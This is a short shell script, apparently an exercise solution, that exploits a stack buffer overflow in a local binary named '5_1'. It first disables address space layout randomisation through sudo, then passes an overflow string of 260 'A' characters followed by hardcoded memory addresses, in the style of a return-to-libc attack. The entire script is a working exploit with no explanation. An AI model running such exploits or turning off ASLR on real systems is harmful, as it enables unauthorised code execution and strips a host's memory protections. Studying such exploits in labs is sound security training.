#!/bin/sh
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space &&
./5_1 `python -c 'print "A"*260 + "\x2c\x31\xef\xb6" + "\x18\x6b\xf9\xb6" + "BBBB" + "\xac\x2f\xeb\xb6\x00"'`
